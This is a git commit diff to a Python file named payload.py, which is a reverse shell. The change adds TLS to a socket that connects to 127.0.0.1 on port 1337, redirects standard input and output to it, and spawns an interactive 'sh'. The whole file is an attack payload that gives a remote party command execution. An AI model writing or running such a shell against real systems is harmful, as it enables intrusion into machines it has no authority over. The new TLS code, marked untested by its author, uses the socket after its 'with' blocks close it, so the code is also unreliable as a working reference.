3a2f0b4b44baca865d8beda0b1f67e7d6ddc3f4d
Lionskey <LoganGoins@protonmail.com>
2023-09-27 20:48:50 -0400

    Added TLS support - untested

--- src/payload.py
+++ src/payload.py
@@ -2,9 +2,17 @@ import socket
 import subprocess
 import os
 import pty
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("127.0.0.1", 1337))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
+import ssl
+
+hostname = '127.0.0.1'
+port = 1337
+context = ssl.create_default_context()
+
+with socket.create_connection((hostname, port)) as sock:
+    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
+        print(ssock.version())
+
+os.dup2(ssock.fileno(),0)
+os.dup2(ssock.fileno(),1)
+os.dup2(ssock.fileno(),2)
 pty.spawn("sh")
